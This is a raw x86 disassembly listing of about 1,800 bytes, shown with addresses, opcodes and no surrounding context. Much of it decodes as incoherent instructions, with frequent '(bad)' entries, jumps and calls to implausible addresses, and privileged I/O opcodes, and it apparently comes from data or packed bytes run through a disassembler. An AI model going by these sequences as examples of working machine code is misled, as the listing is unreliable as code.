  432df8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432dfe:	add    eax,edi
  432e00:	shr    eax,cl
  432e02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432e08:	mov    esi,DWORD PTR [esp+ebp*8]
  432e0b:	pushf  
  432e0c:	ret    0x84c7
  432e0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432e15:	inc    ebp
  432e16:	in     al,dx
  432e17:	xor    eax,0xc78b9c45
  432e1c:	cld    
  432e1d:	fmul   st(2),st
  432e1f:	sbb    dl,al
  432e21:	jmp    0x9c3b:0x364d45c1
  432e28:	jbe    0x432df1
  432e2a:	mov    esp,eax
  432e2c:	clc    
  432e2d:	add    BYTE PTR [ebp+0x0],cl
  432e30:	mov    ecx,ecx
  432e32:	lea    eax,[ebp-0x5]
  432e35:	mov    edi,edi
  432e37:	call   0x51ce8181
  432e3c:	hlt    
  432e3d:	xor    eax,edx
  432e3f:	mov    esi,0x9a7284
  432e44:	xor    cl,dl
  432e46:	mov    esi,eax
  432e48:	hlt    
  432e49:	into   
  432e4a:	inc    ebp
  432e4b:	scas   eax,DWORD PTR es:[edi]
  432e4c:	mov    ebp,ecx
  432e4e:	cld    
  432e4f:	add    dl,cl
  432e51:	add    dl,al
  432e53:	inc    ebp
  432e54:	shr    DWORD PTR [ebx],0x4d
  432e57:	xor    edi,DWORD PTR [ebx]
  432e59:	mov    DWORD PTR [edi],ecx
  432e5b:	clc    
  432e5c:	dec    esi
  432e5d:	inc    ebp
  432e5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432e64:	ret    0xc6ca
  432e67:	mov    BYTE PTR [ebp-0x32],0x53
  432e6b:	scas   eax,DWORD PTR es:[edi]
  432e6c:	inc    ebp
  432e6d:	jmp    0x432ea5
  432e6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432e76:	pop    ebx
  432e77:	xor    ecx,DWORD PTR [ebp+0x3]
  432e7a:	mov    eax,DWORD PTR [ebx]
  432e7c:	clc    
  432e7d:	test   edx,ecx
  432e7f:	mov    ecx,esi
  432e81:	cld    
  432e82:	call   0x8ab773cc
  432e87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432e8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432e93:	fdiv   QWORD PTR [ebx]
  432e95:	retf   0xce89
  432e98:	in     al,0xc1
  432e9a:	inc    ebp
  432e9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432ea1:	into   
  432ea2:	mov    dh,0xc1
  432ea5:	call   0x8c17742e
  432eaa:	(bad)  
  432eab:	cld    
  432eac:	mov    ecx,DWORD PTR [ebp-0x14]
  432eaf:	xor    eax,ecx
  432eb1:	lea    eax,[ebp+0x8]
  432eb4:	mov    esi,DWORD PTR [edx-0x4]
  432eb7:	add    dl,al
  432eb9:	inc    ebp
  432eba:	mov    esp,0x32d89a8b
  432ebf:	dec    ebp
  432ec0:	mov    esi,DWORD PTR [ebx]
  432ec2:	cld    
  432ec3:	xor    eax,edx
  432ec5:	sub    esp,DWORD PTR [esi-0x75]
  432ec8:	int    0xec
  432eca:	sub    ecx,eax
  432ecc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432ed2:	mov    esi,esp
  432ed4:	call   0x34177c5d
  432ed9:	inc    DWORD PTR [ebx]
  432edb:	mov    edi,DWORD PTR [ebx]
  432edd:	cld    
  432ede:	jne    0x432f2d
  432ee0:	mov    esi,DWORD PTR [ebx]
  432ee2:	aam    0x8d
  432ee4:	dec    ebp
  432ee5:	or     BYTE PTR [ebx],dh
  432ee7:	jb     0x432eec
  432ee9:	add    BYTE PTR [edi+0x45],bl
  432eec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ef3:	xor    ebp,esp
  432ef5:	xor    eax,edi
  432ef7:	sub    edi,esp
  432ef9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432eff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432f06:	inc    ebp
  432f07:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432f0d:	clc    
  432f0e:	mov    eax,edi
  432f10:	nop
  432f11:	fadd   QWORD PTR [eax]
  432f13:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432f19:	jmp    0x432ea4
  432f1b:	mov    eax,DWORD PTR [ecx]
  432f1d:	fadd   DWORD PTR [eax]
  432f1f:	inc    ebp
  432f20:	or     DWORD PTR [ebx],esi
  432f22:	dec    eax
  432f23:	add    edx,DWORD PTR [ebx-0x2d]
  432f26:	dec    ebp
  432f27:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432f2d:	inc    ebp
  432f2e:	push   ebx
  432f2f:	mov    dl,BYTE PTR [ecx-0xd]
  432f32:	xor    ecx,DWORD PTR [ebp-0x45]
  432f35:	(bad)  
  432f37:	rol    BYTE PTR [eax],0xc1
  432f3a:	ret    
  432f3b:	inc    ebp
  432f3c:	inc    ebp
  432f3d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432f43:	xor    eax,ebx
  432f45:	add    eax,DWORD PTR [ebp+0x23]
  432f48:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  432f4e:	cmp    edi,0xc
  432f51:	dec    ebp
  432f52:	inc    ebp
  432f53:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  432f59:	inc    ebp
  432f5a:	mov    esi,DWORD PTR [ebx]
  432f5c:	clc    
  432f5d:	lea    eax,[ebp+0x45725407]
  432f63:	add    BYTE PTR [ebp+eax*2-0x75],dh
  432f67:	xor    edi,DWORD PTR [eax]
  432f69:	mov    ecx,0xff8b8d4d
  432f6e:	push   esp
  432f6f:	enter  0x4df7,0x23
  432f73:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  432f79:	mov    eax,DWORD PTR [ebx]
  432f7b:	loopne 0x432f68
  432f7d:	ret    0xc68b
  432f80:	push   esp
  432f81:	enter  0x9745,0x8b
  432f85:	inc    ebp
  432f86:	cld    
  432f87:	mov    eax,edi
  432f89:	clc    
  432f8a:	ret    
  432f8b:	ret    0xc645
  432f8e:	mov    esi,DWORD PTR [ebx]
  432f90:	cld    
  432f91:	pop    esi
  432f92:	mov    ebx,0x83458bc3
  432f98:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  432f9c:	dec    ebp
  432f9d:	xor    eax,0xba039c33
  432fa2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  432fa8:	inc    ebp
  432fa9:	mov    edi,DWORD PTR [ebx]
  432fab:	adc    al,0x9c
  432fad:	inc    ebp
  432fae:	(bad)  
  432faf:	mov    ebx,eax
  432fb1:	adc    al,0x85
  432fb3:	cmp    al,0x1
  432fb6:	inc    ebp
  432fb7:	add    BYTE PTR [ecx],bh
  432fb9:	dec    ebp
  432fba:	pushf  
  432fbb:	mov    ebp,ecx
  432fbd:	mov    eax,DWORD PTR [ebx]
  432fbf:	nop
  432fc0:	add    BYTE PTR [eax],al
  432fc2:	inc    ebp
  432fc3:	mov    esi,DWORD PTR [ebx]
  432fc5:	add    eax,DWORD PTR [ebx]
  432fc7:	cmp    al,0x89
  432fc9:	mov    esp,esi
  432fcb:	clc    
  432fcc:	inc    ebp
  432fcd:	inc    ebp
  432fce:	add    edx,DWORD PTR [esi+0xc]
  432fd1:	mov    edi,0x7ff0845
  432fd6:	in     al,dx
  432fd7:	(bad)  
  432fd8:	jne    0x432f74
  432fda:	mov    esi,DWORD PTR [edx]
  432fdc:	clc    
  432fdd:	add    ebp,DWORD PTR [esi]
  432fdf:	mov    edi,edi
  432fe1:	in     al,dx
  432fe2:	mov    DWORD PTR [ebp-0x10],eax
  432fe5:	xor    eax,DWORD PTR [ebp+0x3]
  432fe8:	cmp    eax,0x8bf49c89
  432fed:	inc    ebp
  432fee:	fmul   DWORD PTR [ebx-0x173caf39]
  432ff4:	lea    ecx,[ecx+0x45e8d4bc]
  432ffa:	clc    
  432ffb:	mov    edi,edi
  432ffd:	cmp    BYTE PTR [ebp+0x4d],al
  433000:	test   DWORD PTR [eax+0x74],ecx
  433003:	inc    ecx
  433004:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43300a:	ret    
  43300b:	inc    eax
  43300c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433012:	push   eax
  433013:	dec    eax
  433014:	test   al,0xd0
  433016:	dec    eax
  433018:	mov    eax,DWORD PTR [ebp-0x14]
  43301b:	mov    eax,DWORD PTR [ebp+0x38]
  43301e:	mov    eax,ecx
  433020:	fadd   DWORD PTR [ebx]
  433022:	dec    ebp
  433023:	inc    eax
  433024:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43302a:	inc    ebp
  43302b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433031:	fadd   QWORD PTR [ebx]
  433033:	inc    ebp
  433034:	or     al,0x33
  433036:	dec    ebp
  433037:	add    edi,DWORD PTR [ebx]
  433039:	mov    DWORD PTR [edx-0x28],esi
  43303c:	mov    eax,DWORD PTR [ebp-0x10]
  43303f:	mov    eax,DWORD PTR [eax+0x10]
  433042:	mov    eax,edi
  433044:	lock ret 
  433046:	inc    ecx
  433047:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43304d:	fsubr  st,st(5)
  43304f:	test   DWORD PTR [eax],eax
  433051:	clc    
  433052:	push   0x45
  433054:	(bad)  
  433055:	cmp    ch,ah
  433057:	pushf  
  433058:	inc    ebp
  433059:	(bad)  
  43305a:	push   eax
  43305b:	fsub   DWORD PTR [eax-0x7b]
  43305e:	(bad)  
  43305f:	clc    
  433060:	mov    eax,0xf8008584
  433065:	mov    eax,DWORD PTR [ebp-0x4]
  433068:	mov    edi,0x4585c3cc
  43306e:	clc    
  43306f:	mov    eax,DWORD PTR [ebp+0x14]
  433072:	cmp    eax,DWORD PTR [ebp-0x64]
  433075:	mov    edi,eax
  433077:	in     al,dx
  433078:	les    esi,FWORD PTR [ebp-0x7b]
  43307b:	mov    edi,eax
  43307d:	or     al,0x4d
  43307f:	dec    ebp
  433080:	mov    eax,ebp
  433082:	in     al,0xf2
  433084:	dec    ebp
  433085:	dec    DWORD PTR [ecx+0x4dc7e045]
  43308b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433091:	inc    ebp
  433092:	mov    DWORD PTR [ebx],esi
  433094:	fadd   QWORD PTR [ebx]
  433096:	dec    ebp
  433097:	push   eax
  433098:	xor    eax,DWORD PTR [ebp+0x3]
  43309b:	push   eax
  43309c:	mov    DWORD PTR [eax+ebx*8],ebx
  43309f:	push   esi
  4330a1:	mov    eax,DWORD PTR [eax]
  4330a3:	lock cmp eax,0xf84e85c0
  4330a9:	inc    ebp
  4330aa:	test   BYTE PTR [ebx],dh
  4330ac:	add    DWORD PTR [ebx],eax
  4330ae:	add    BYTE PTR [eax+0x4d],dl
  4330b1:	jne    0x4330e6
  4330b3:	lea    ecx,[ebx-0x7617fc44]
  4330b9:	div    ah
  4330bb:	inc    DWORD PTR [ebp+0x45]
  4330be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4330c4:	jb     0x433051
  4330c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4330cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4330d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4330d3:	mov    edi,DWORD PTR [ebx]
  4330d5:	adc    BYTE PTR [ebp+0x41],dh
  4330d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4330de:	ret    
  4330df:	push   ss
  4330e0:	push   0x45
  4330e2:	lea    ecx,[ebx+0x4de80cb0]
  4330e8:	sti    
  4330e9:	add    edi,edi
  4330eb:	or     BYTE PTR [ebp+0x4d],al
  4330ee:	mov    ebp,DWORD PTR [ebx]
  4330f0:	xor    ebp,ecx
  4330f2:	mov    al,BYTE PTR [edx]
  4330f4:	add    eax,0xc7200
  4330f9:	jne    0x433148
  4330fb:	lea    esi,[ebx]
  4330fd:	mov    al,0xf
  4330ff:	call   0xf27c4
  433104:	shl    DWORD PTR ds:0x89019c84,0x0
  43310b:	rol    BYTE PTR [ebp+0x45],1
  43310e:	mov    esi,DWORD PTR [ebx+esi*1]
  433111:	pushf  
  433112:	mov    al,bh
  433114:	add    eax,0x8572c8
  433119:	clc    
  43311a:	dec    ebp
  43311b:	inc    ebp
  43311c:	xor    edi,DWORD PTR [edx]
  43311e:	setl   al
  433121:	(bad)  
  433122:	retf   
  433123:	rol    cl,1
  433125:	dec    ebp
  433126:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43312c:	inc    ebp
  43312d:	lea    ecx,[ebx-0x75b2cc38]
  433133:	lea    eax,ds:0x4d72c4
  433139:	mov    ecx,DWORD PTR [ebp-0x4]
  43313c:	xor    ecx,edi
  43313e:	bswap  ebx
  433140:	ror    BYTE PTR [ebp-0x35],0xe9
  433144:	rol    DWORD PTR [ecx],0x84
  433147:	add    BYTE PTR [ecx],al
  433149:	cmp    eax,DWORD PTR [eax]
  43314b:	pushf  
  43314c:	inc    ebp
  43314d:	jnp    0x8a436550
  433153:	mov    eax,DWORD PTR ds:0xcf72e8
  433159:	lock dec ebp
  43315b:	retf   
  43315c:	xor    ecx,DWORD PTR [ebp+0xf]
  43315f:	mov    eax,eax
  433161:	fmul   st,st(3)
  433163:	test   ecx,0x19a8484
  433169:	xor    al,BYTE PTR [eax]
  43316b:	mov    DWORD PTR [ebp-0x28],eax
  43316e:	mov    eax,DWORD PTR [ebp+0x33]
  433171:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433177:	ret    
  433178:	add    al,cl
  43317a:	dec    ebp
  43317b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433181:	add    ecx,DWORD PTR ds:0xc7250
  433187:	inc    ebp
  433188:	rcl    DWORD PTR [eax+0x4d],0x2b
  43318c:	mov    edi,edi
  43318e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433194:	jb     0x43315d
  433196:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43319d:	mov    esi,DWORD PTR [ebx]
  43319f:	cld    
  4331a0:	mov    cl,bh
  4331a2:	or     eax,0x372b6
  4331a7:	cmp    ecx,eax
  4331a9:	jne    0x433226
  4331af:	mov    eax,DWORD PTR [ebp-0x20]
  4331b2:	mov    eax,DWORD PTR [eax]
  4331b4:	xor    eax,edi
  4331b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4331bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331c0:	mov    ecx,edi
  4331c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331c8:	jb     0x4331d9
  4331ca:	add    BYTE PTR [edi-0x3f],dl
  4331cd:	add    BYTE PTR [ebp-0x75],cl
  4331d0:	mov    esi,eax
  4331d2:	xor    eax,DWORD PTR [eax]
  4331d4:	mov    al,bh
  4331d6:	or     eax,0x4a7284
  4331db:	xor    al,cl
  4331dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4331e0:	mov    ecx,edi
  4331e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4331e8:	jb     0x4331f9
  4331ea:	add    BYTE PTR [edi],dh
  4331ec:	enter  0x8500,0x8b
  4331f0:	add    ah,bl
  4331f2:	add    BYTE PTR [eax],al
  4331f4:	inc    ebp
  4331f5:	(bad)  
  4331f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4331fd:	mov    esi,DWORD PTR [edx-0x4]
  433200:	add    bh,cl
  433202:	dec    ebp
  433203:	mov    dh,0x8b
  433205:	add    esi,DWORD PTR [ebx]
  433207:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43320d:	add    BYTE PTR [eax],al
  43320f:	mov    eax,ecx
  433211:	loopne 0x433260
  433213:	add    BYTE PTR [ebx-0x757bcc39],cl
  433219:	dec    edx
  43321a:	or     eax,0x8b7232
  43321f:	in     al,0xc1
  433221:	or     DWORD PTR [ebp-0x31],ecx
  433224:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43322b:	xor    dh,BYTE PTR [edx-0x75]
  43322e:	add    al,dh
  433230:	enter  0x4f09,0xcf
  433234:	inc    ebp
  433235:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43323b:	or     al,BYTE PTR ds:0xe4728b
  433241:	or     DWORD PTR [ebp-0x31],ecx
  433244:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43324b:	cmp    dh,BYTE PTR [edx+0xf]
  43324e:	add    bl,dl
  433250:	rol    DWORD PTR [eax],0x4d
  433253:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433259:	(bad)  
  43325a:	or     eax,0x4a7284
  43325f:	xor    al,cl
  433261:	mov    ecx,DWORD PTR [ebp-0x20]
  433264:	mov    ecx,DWORD PTR [ecx]
  433266:	xor    ecx,edi
  433268:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43326f:	xor    cl,al
  433271:	mov    ecx,DWORD PTR [edi]
  433273:	fadd   QWORD PTR [ebp+0x9]
  433276:	call   0xffd02d4a
  43327b:	dec    edx
  43327c:	dec    ebp
  43327d:	xor    bh,BYTE PTR [ebx]
  43327f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433283:	loopne 0x433281
  433285:	or     edi,eax
  433287:	iret   
  433288:	ret    
  433289:	mov    WORD PTR [ebp+0x4e],es
  43328c:	mov    esi,DWORD PTR [edx]
  43328e:	call   0x8452f9cd
  433293:	(bad)  
  433294:	call   0x8bdc:0x338b3200
  43329b:	add    ah,bh
  43329d:	(bad)  
  43329e:	push   ebp
  43329f:	test   BYTE PTR [ebx],dh
  4332a1:	dec    edx
  4332a2:	add    esi,DWORD PTR [edx]
  4332a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4332aa:	dec    edi
  4332ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4332b3:	xor    al,BYTE PTR [ebx]
  4332b5:	mov    edi,DWORD PTR [ebx]
  4332b7:	in     al,0x75
  4332b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4332bf:	dec    edx
  4332c0:	xor    esi,DWORD PTR [edx]
  4332c2:	lea    ecx,[edx]
  4332c4:	or     BYTE PTR [ebx+0x900f072],cl
  4332ca:	ja     0x43329b
  4332cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4332d3:	cmp    ch,al
  4332d5:	jne    0x4332ca
  4332d7:	mov    edi,edi
  4332d9:	fadd   QWORD PTR [ebp+0x0]
  4332dc:	mov    eax,edi
  4332de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4332e5:	mov    edx,DWORD PTR [ebx]
  4332e7:	in     al,0x45
  4332e9:	or     DWORD PTR [ebx],esi
  4332eb:	iret   
  4332ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4332f3:	xor    dl,BYTE PTR [eax-0x75]
  4332f6:	sbb    al,0xe0
  4332f8:	dec    DWORD PTR [ecx]
  4332fa:	mov    ecx,edi
  4332fc:	in     al,dx
  4332fd:	mov    eax,es
  4332ff:	dec    edx
  433300:	mov    DWORD PTR [edx],esi
  433302:	fmul   QWORD PTR [edx]
  433304:	jne    0x433291
  433306:	(bad)  
  433307:	(bad)  
  433309:	or     DWORD PTR [ebp-0x31],eax
  43330c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433313:	cmp    bh,bh
  433315:	jne    0x43335c
  433317:	lea    ecx,[ebx-0x38372750]
  43331d:	inc    ebx
  43331f:	mov    eax,ecx
  433321:	mov    eax,0xa00c111
  433326:	jne    0x43336d
  433328:	mov    esi,DWORD PTR [ebx]
  43332a:	test   al,0x3
  43332c:	inc    ebp
  43332d:	mov    DWORD PTR [eax-0xc],edx
  433330:	loop   0x433377
  433332:	push   DWORD PTR [ebx]
  433334:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43333a:	add    DWORD PTR [eax],eax
  43333c:	mov    eax,edi
  43333e:	lods   al,BYTE PTR ds:[esi]
  43333f:	dec    ebp
  433340:	inc    ebp
  433341:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433347:	retf   
  433348:	mov    edx,ecx
  43334a:	adc    al,0x84
  43334c:	(bad)  
  43334d:	std    
  43334e:	ret    
  43334f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433355:	hlt    
  433356:	rol    edi,0x82
  433359:	ret    
  43335a:	cld    
  43335b:	enter  0x11ff,0x45
  43335f:	inc    ebp
  433360:	pop    edi
  433361:	mov    ebx,DWORD PTR [ebx+0x14]
  433364:	ret    0xc7
  433367:	test   BYTE PTR [ebx+0x4532519a],cl
  43336d:	jmp    0x4332fa
  43336f:	push   0x8
  433371:	call   DWORD PTR [esi]
  433373:	in     al,dx
  433374:	add    BYTE PTR [ebp+0x1],0x50
  433378:	add    bh,ah
  43337a:	add    bh,bh
  43337c:	icebp  
  43337d:	mov    ecx,DWORD PTR [eax]
  43337f:	cld    
  433380:	pop    es
  433381:	dec    ebp
  433382:	shl    DWORD PTR [ebx],0x72
  433385:	add    eax,DWORD PTR [eax]
  433387:	cmp    edx,ecx
  433389:	je     0x43339b
  43338b:	mov    esi,DWORD PTR [ebp-0x4]
  43338e:	inc    edi
  433390:	or     al,0xc3
  433392:	jmp    FWORD PTR [edx-0x18]
  433395:	(bad)  
  433396:	sti    
  433397:	cwde   
  433398:	(bad)  
  433399:	call   0xffa12ca4
  43339e:	or     al,0x45
  4333a0:	push   ebp
  4333a1:	sub    esp,0x18
  4333a4:	push   ebx
  4333a5:	inc    ebp
  4333a6:	mov    edi,edi
  4333a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4333af:	test   al,0x53
  4333b1:	inc    ebp
  4333b2:	push   ecx
  4333b3:	push   eax
  4333b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4333ba:	add    ah,bh
  4333bc:	(bad)  
  4333bd:	dec    ebp
  4333be:	add    DWORD PTR [ebx],esi
  4333c0:	inc    ebp
  4333c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4333c7:	push   0xffffff8b
  4333c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4333cf:	add    eax,DWORD PTR [ecx]
  4333d1:	or     BYTE PTR [eax],al
  4333d3:	call   0xff852bd8
  4333d8:	mov    eax,DWORD PTR [ebp+0x14]
  4333db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4333e1:	inc    ebp
  4333e2:	dec    ecx
  4333e3:	add    ebp,DWORD PTR [edx+0x14]
  4333e6:	push   0x8b3045
  4333eb:	call   0x33ad8160
  4333f0:	inc    DWORD PTR [ebx]
  4333f2:	mov    DWORD PTR [edi],ecx
  4333f4:	mov    eax,ecx
  4333f6:	or     BYTE PTR [ebp-0x3d],cl
  4333f9:	cmp    eax,edi
  4333fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433400:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433406:	adc    al,0xc9
  433408:	inc    ebp
  433409:	adc    BYTE PTR [eax+0x55],dl
  43340c:	jne    0x4333fa
  43340e:	call   0xff54339e
  433413:	dec    ebp
  433414:	inc    ebp
  433415:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43341b:	add    BYTE PTR [ebx],bh
  43341d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433421:	push   ebx
  433422:	or     al,0x51
  433424:	dec    ebp
  433425:	xor    DWORD PTR [ebx],0xf32039a
  43342b:	cmp    eax,DWORD PTR [ebp+0x74]
  43342e:	mov    edi,edi
  433430:	pop    edi
  433431:	adc    BYTE PTR [ebx+0x75],bl
  433434:	ret    0x50
  433437:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43343b:	(bad)  
  43343c:	clc    
  43343d:	mov    esp,ebp
  43343f:	pop    ecx
  433440:	mov    ecx,0xf80085c2
  433445:	mov    ecx,DWORD PTR [ecx+edx*2]
  433448:	push   esi
  433449:	push   esi
  43344a:	(bad)  
  43344b:	lock inc DWORD PTR [ebp+0x44]
  43344f:	mov    edx,DWORD PTR [eax]
  433451:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433455:	or     BYTE PTR [ebx+0x7],dl
  433458:	push   ecx
  433459:	ret    
  43345a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433460:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433466:	or     al,0x80
  433468:	jge    0x43346b
  43346a:	mov    DWORD PTR [eax],eax
  43346c:	and    al,0x8
  43346e:	cmp    DWORD PTR [ebp+0x10],eax
  433471:	mov    edx,DWORD PTR [esi]
  433473:	xchg   esp,eax
  433474:	dec    esp
  433475:	add    BYTE PTR [eax],dl
  433477:	mov    ecx,edx
  433479:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43347d:	dec    ebp
  43347e:	into   
  43347f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433485:	mov    edx,DWORD PTR [eax+0x14]
  433488:	das    
  433489:	add    al,0x45
  43348b:	add    BYTE PTR [ebp+0x0],dh
  43348e:	mov    edi,edi
  433490:	and    al,0x50
  433492:	mov    eax,DWORD PTR [eax]
  433494:	and    al,0xd1
  433496:	xor    eax,DWORD PTR [esi]
  433498:	lea    eax,[ebp+0x8]
  43349b:	xor    esi,DWORD PTR [edx+0x3]
  43349e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4334a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4334aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4334b4:	cmp    bh,bh
  4334b6:	pushf  
  4334b7:	mov    edi,edi
  4334b9:	or     BYTE PTR [esi+ecx*1],cl
  4334bc:	jne    0x433481
  4334be:	call   0xc348a
  4334c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4334c7:	mov    ebx,DWORD PTR [eax]
  4334c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4334cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4334d5:	pop    esi
  4334d6:	jmp    0x4334a1
  4334d8:	and    al,0x10
  4334da:	and    al,0x55
  4334dc:	or     ah,ch
  4334de:	and    al,0xe4
  4334e0:	inc    DWORD PTR [ebx+0x35e81024]
  4334e6:	(bad)  
  4334e7:	pushf  
  4334e8:	dec    DWORD PTR [ecx+0x570c2444]
  4334ee:	pop    esi
  4334ef:	inc    ecx
  4334f0:	in     eax,0x89
  4334f2:	ret    0x24
  4334f5:	mov    edi,eax
  4334f7:	and    al,0x7d
  4334f9:	mov    edx,0x768089c
  4334fe:	clc    
  4334ff:	cli    
  433500:	call   FWORD PTR [edx+0x3893274]
  433506:	dec    DWORD PTR [ecx-0x74e7db01]
  43350c:	adc    al,0xc
  43350e:	(bad)  
  43350f:	jl     0x433535
  433511:	adc    al,0x8b
  433513:	dec    ebp
  433514:	or     al,0x75
  433516:	jmp    0x4334a3
  433518:	adc    BYTE PTR [esp+eax*2],ah
  43351b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43351f:	and    al,0x9a
  433521:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433527:	dec    esp
  433528:	jne    0x433532
  43352a:	jne    0x433565
  43352c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433533:	test   BYTE PTR [ebp+0x32],bl
  433536:	and    al,0x85
  433538:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43353e:	pop    edi
  43353f:	(bad)  
  433540:	sbb    edx,DWORD PTR [eax]
  433542:	add    dl,dl
  433544:	cmp    edx,DWORD PTR [eax]
  433546:	add    BYTE PTR [esi+0x7e],al
  433549:	adc    BYTE PTR [eax],al
  43354b:	mov    eax,ds:0x1c00107e
  433550:	push   edx
  433551:	adc    BYTE PTR [eax],al
  433553:	cli    
  433554:	push   ss
  433555:	adc    BYTE PTR [eax],al
  433557:	lahf   
  433558:	adc    edx,DWORD PTR [eax]
  43355a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43355e:	add    BYTE PTR [edi+0x19001004],ah
  433564:	inc    eax
  433565:	adc    BYTE PTR [eax],al
  433567:	ds jge 0x43357a
  43356a:	add    BYTE PTR [edi],bh
  43356c:	xor    eax,0x35430043
  433571:	inc    ebx
  433572:	add    BYTE PTR [edi+0x35],al
  433575:	inc    ebx
  433576:	add    BYTE PTR [ebx+0x35],cl
  433579:	inc    ebx
  43357a:	add    BYTE PTR [edi+0x35],cl
  43357d:	inc    ebx
  43357e:	add    BYTE PTR [ebx+0x35],dl
  433581:	inc    ebx
  433582:	add    BYTE PTR [edi+0x35],dl
  433585:	inc    ebx
  433586:	add    BYTE PTR [ebx+0x35],bl
  433589:	inc    ebx
  43358a:	add    BYTE PTR [edi+0x35],bl
  43358d:	inc    ebx
  43358e:	add    BYTE PTR [ebx+0x35],ah
  433591:	inc    ebx
  433592:	add    BYTE PTR [edi+0x35],ah
  433595:	inc    ebx
  433596:	add    BYTE PTR [ecx],ah
  433598:	jno    0x4335aa
  43359a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4335a1:	adc    BYTE PTR [eax],al
  4335a3:	ja     0x433615
  4335a5:	adc    BYTE PTR [eax],al
  4335a7:	xor    BYTE PTR [edx+0x10],0x0
  4335ab:	loopne 0x43361b
  4335ad:	adc    BYTE PTR [eax],al
  4335af:	cmp    BYTE PTR [eax+0x10],dl
  4335b2:	add    BYTE PTR ds:0x9700104f,al
  4335b8:	xor    eax,0x359b0043
  4335bd:	inc    ebx
  4335be:	add    BYTE PTR [edi-0x5cffbccb],bl
  4335c4:	xor    eax,0x35a70043
  4335c9:	inc    ebx
  4335ca:	add    BYTE PTR [ebx-0x50ffbccb],ch
  4335d0:	xor    eax,0x35b30043
  4335d5:	inc    ebx
